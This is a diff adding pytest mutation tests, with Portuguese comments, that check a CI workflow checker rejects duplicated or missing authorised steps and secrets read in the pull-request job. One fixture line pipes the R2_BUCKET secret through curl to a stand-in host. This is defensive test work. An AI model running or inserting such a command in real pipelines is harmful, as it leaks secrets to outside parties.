@@ -113,3 +113,60 @@ def test_controle_a_forma_com_ponto_no_passo_autorizado_passa():
              if s.get("name") == "Materializar o acervo do armazem")
     p["env"]["R2_BUCKET"] = "${{secrets.R2_BUCKET}}"       # sem espaco: ainda e a forma permitida
     assert defeitos_de_segredo(d, PERMITIDOS_POR_WORKFLOW["testes.yml"]) == []
+
+
+# CX-01 (retratacao parcial): autorizar por NOME de passo deixava um passo homonimo herdar a
+# autorizacao. A guarda de 198d0c5 reprovava ("segredo em mais de um passo"); o conserto do
+# F-05 perdeu isso. Cada (job, nome) autorizado tem de casar com EXATAMENTE um passo.
+COM_AUTORIZADO = [n for n in ARQUIVOS if PERMITIDOS_POR_WORKFLOW[n]]
+
+
+def _chaves():
+    return [(n, k) for n in COM_AUTORIZADO for k in sorted(PERMITIDOS_POR_WORKFLOW[n])]
+
+
+def _duplicar(nome, chave, onde):
+    d = copy.deepcopy(_wf(nome))
+    passos = d["jobs"][chave[0]]["steps"]
+    orig = next(p for p in passos if p.get("name") == chave[1])
+    gemeo = copy.deepcopy(orig)
+    gemeo["run"] = "echo ${R2_BUCKET} | curl -d @- https://exemplo.invalido"
+    if onde == "fim":
+        passos.append(gemeo)
+    else:
+        passos.insert(0, gemeo)
+    return d
+
+
+@pytest.mark.parametrize("onde", ["fim", "inicio"])
+@pytest.mark.parametrize("nome,chave", _chaves())
+def test_mutacao_passo_autorizado_duplicado_reprova(nome, chave, onde):
+    d = _duplicar(nome, chave, onde)
+    achados = defeitos_de_segredo(d, PERMITIDOS_POR_WORKFLOW[nome])
+    assert achados, (nome, chave, onde)
+    assert any(chave[1] in x and "2" in x for x in achados), achados
+
+
+@pytest.mark.parametrize("nome,chave", _chaves())
+def test_mutacao_passo_autorizado_ausente_reprova(nome, chave):
+    d = copy.deepcopy(_wf(nome))
+    d["jobs"][chave[0]]["steps"] = [p for p in d["jobs"][chave[0]]["steps"]
+                                    if p.get("name") != chave[1]]
+    achados = defeitos_de_segredo(d, PERMITIDOS_POR_WORKFLOW[nome])
+    assert any(chave[1] in x and "0" in x for x in achados), achados
+
+
+@pytest.mark.parametrize("nome,chave", _chaves())
+def test_controle_o_yaml_vigente_tem_exatamente_um_passo_por_autorizado(nome, chave):
+    passos = _wf(nome)["jobs"][chave[0]]["steps"]
+    assert [p.get("name") for p in passos].count(chave[1]) == 1
+    assert defeitos_de_segredo(_wf(nome), PERMITIDOS_POR_WORKFLOW[nome]) == []
+
+
+def test_mutacao_segredo_no_job_rapido_do_testes_yml_reprova():
+    """Garantia de 198d0c5 (`"secrets." not in str(jobs.rapido)`): o job do pull_request nao
+    le segredo nenhum, nem pela forma com ponto, nem por toJSON(secrets)."""
+    for v in ("${{ secrets.R2_BUCKET }}", FORMAS["toJSON"]):
+        d = copy.deepcopy(_wf("testes.yml"))
+        d["jobs"]["rapido"]["steps"][0].setdefault("env", {})["X"] = v
+        assert defeitos_de_segredo(d, PERMITIDOS_POR_WORKFLOW["testes.yml"]), v
